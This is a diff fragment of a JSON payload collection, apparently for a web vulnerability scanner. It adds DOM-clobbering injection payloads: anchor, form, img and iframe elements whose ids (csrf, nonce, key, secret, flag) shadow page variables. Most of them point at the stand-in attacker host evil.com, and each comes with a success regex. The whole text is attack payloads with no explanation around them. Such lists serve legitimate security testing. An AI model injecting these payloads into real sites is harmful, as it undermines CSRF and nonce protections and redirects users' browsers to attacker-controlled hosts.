+    "payload_string": "<form id=\"xsrf\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74094",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"xsrf\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74095",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"xsrf\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74096",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"csrf\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74097",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"csrf\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74098",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"csrf\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74099",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"csrf\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74100",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"nonce\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74101",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"nonce\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74102",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"nonce\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74103",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"nonce\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74104",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"key\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74105",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"key\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74106",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"key\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74107",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"key\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74108",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"secret\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74109",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"secret\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74110",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"secret\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74111",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"secret\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74112",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"flag\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74113",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"flag\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74114",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"flag\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74115",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"flag\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74116",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"debug\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74117",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"debug\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74118",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"debug\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74119",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"debug\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74120",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"error\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74121",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"error\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74122",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"error\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74123",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"error\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
   }
 ]
